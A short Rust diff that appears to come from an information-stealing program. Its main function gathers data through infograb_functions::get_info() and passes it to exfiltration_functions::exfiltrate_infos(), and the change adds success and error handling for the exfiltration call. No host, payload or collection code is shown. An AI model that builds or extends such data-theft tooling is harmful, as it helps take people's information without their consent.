@@ -19,7 +19,11 @@ fn main() {
     println!("Trying to get info");
     let result = infograb_functions::get_info();
     println!("{:?}", result);
-    exfiltration_functions::exfiltrate_infos(result);
+    let resp = exfiltration_functions::exfiltrate_infos(result);
+    match resp {
+        Ok(_) => println!("Success"),
+        Err(e) => eprintln!("Error: {}", e),
+    }
 }
 fn style() {
     println!("---------------------------------------");
